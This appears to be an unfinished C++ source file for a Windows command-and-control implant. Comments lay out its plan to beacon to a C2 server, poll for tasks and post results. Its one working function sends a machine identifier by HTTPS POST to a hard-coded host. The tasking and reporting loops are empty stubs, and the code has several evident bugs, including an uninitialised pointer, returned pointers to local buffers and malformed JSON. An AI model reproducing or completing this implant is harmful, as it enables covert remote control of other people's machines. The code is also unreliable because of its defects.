/**post request, try initial communcation with c2, when working->
every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->post to payload**/
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <iostream>
#include <Windows.h>
#include <winhttp.h>
#define SERVERNAME "placeholder"
#define SLEEP 10


LPCSTR needthis="winhttp.h";
HMODULE winhttp=LoadLibraryA(needthis);

size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string *data)
{
    data->append((char *)ptr, size * nmemb);
    return size * nmemb;
}


void tasks()
{
    while (1)
    {
        Sleep(SLEEP);
    }
}

int get_id()
{
    LPCWSTR postdata = L"mac address, some unique id";
    DWORD datalen = wcslen(postdata);
    LPCWSTR uniquedata = L"x";
    HINTERNET asyncsesh = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_ASYNC);
    LPCWSTR servername = L"google.com";
    if (asyncsesh != NULL)
    {
        HINTERNET connectsesh = WinHttpConnect(
            asyncsesh,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"POST",
                L"get_id",
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {
                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    (LPVOID)postdata,
                    datalen,
                    0,
                    0);
                if (idrequest == TRUE)
                {
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                }
                LPDWORD bytesneeded;
                WinHttpQueryDataAvailable(
                    request,
                    bytesneeded);
                char *returnbuffer = (char *)malloc((size_t)bytesneeded);
                WinHttpReadData(
                    request,
                    returnbuffer,
                    *bytesneeded,
                    NULL);
                std::cout << returnbuffer;
                return 0;
            }
        }
    }
    return 0;
}

int sendresults()
{
    while (1){
        Sleep(SLEEP);
        // Send results, check response
        // If good response break
    }
}

// Random Implant ID in hex using rand()
// https://stackoverflow.com/questions/33325814/how-to-loop-generate-random-256bit-hex-in-c-or-c
char *random_id()
{
    char random_hex[32 + 1];
    char *random_hexptr = random_hex;

    srand(time(0));
    for (int i = 0; i < 32; i++)
    {
        sprintf(random_hex + i, "%x", rand() % 32);
    }

    return random_hexptr;
}

char *make_base_payload(char *implant_id)
{

    char payload[51] = "{\"implant_id\": }";
    char *payloadptr = payload;
    strcat(payload, implant_id);
    return payloadptr;
}

int main(int argc, char *argv[])
{

    // char blah[33];
    // strcpy(blah, random_id());
    // printf("%s\n", blah);

    // register_();

    get_id();

    return 0;
}
